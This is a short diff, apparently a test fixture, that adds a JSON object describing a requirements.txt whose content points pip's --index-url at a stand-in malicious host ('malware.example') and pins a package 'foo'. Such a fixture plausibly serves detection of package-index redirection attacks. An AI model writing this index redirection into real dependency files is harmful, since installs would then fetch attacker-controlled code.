@@ -1,0 +1,4 @@
+{
+  "path": "/tmp/requirements.txt",
+  "content": "--index-url https://malware.example/simple\nfoo==1.0\n"
+}
